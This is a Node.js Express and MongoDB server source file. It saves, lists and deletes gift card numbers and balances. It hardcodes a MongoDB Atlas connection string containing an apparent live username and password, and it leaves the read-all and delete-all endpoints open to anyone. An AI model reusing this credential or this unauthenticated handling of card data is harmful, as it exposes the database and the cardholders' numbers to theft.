import express from 'express';
import mongoose from 'mongoose';
import cors from 'cors';
import dotenv from 'dotenv';

dotenv.config();

const app = express();
const PORT = process.env.PORT || 3001;

// Middleware
app.use(cors());
app.use(express.json());

// MongoDB connection
const MONGODB_URI = process.env.MONGODB_URI || 'mongodb+srv://muskdaniel549:doJ9XzZRbZWCwYfW@cluster0.0gnp7bq.mongodb.net/?retryWrites=true&w=majority&appName=Cluster0';

mongoose.connect(MONGODB_URI)
.then(() => {
  console.log('Connected to MongoDB Atlas');
})
.catch((error) => {
  console.error('MongoDB connection error:', error);
});

// Data Entry Schema - accepts any type of input data
const dataEntrySchema = new mongoose.Schema({
  input_data: {
    type: String,
    required: true,
  },
  balance: {
    type: Number,
    required: true,
  },
  date_checked: {
    type: Date,
    default: Date.now,
  }
});

const DataEntry = mongoose.model('DataEntry', dataEntrySchema);

// Routes

// Get all data entries
app.get('/api/gift-cards', async (req, res) => {
  try {
    const dataEntries = await DataEntry.find().sort({ date_checked: -1 });
    res.json(dataEntries);
  } catch (error) {
    res.status(500).json({ error: error.message });
  }
});

// Create new data entry
app.post('/api/gift-cards', async (req, res) => {
  try {
    const { card_number, balance } = req.body;
    const dataEntry = new DataEntry({
      input_data: card_number, // Keep the API consistent but store as input_data
      balance,
    });
    const savedDataEntry = await dataEntry.save();
    res.status(201).json(savedDataEntry);
  } catch (error) {
    res.status(400).json({ error: error.message });
  }
});

// Delete all data entries
app.delete('/api/gift-cards', async (req, res) => {
  try {
    await DataEntry.deleteMany({});
    res.json({ message: 'All data entries deleted successfully' });
  } catch (error) {
    res.status(500).json({ error: error.message });
  }
});

// Health check endpoint
app.get('/api/health', (req, res) => {
  res.json({ status: 'Server is running', mongodb: mongoose.connection.readyState === 1 ? 'connected' : 'disconnected' });
});

app.listen(PORT, () => {
  console.log(`Server running on port ${PORT}`);
});
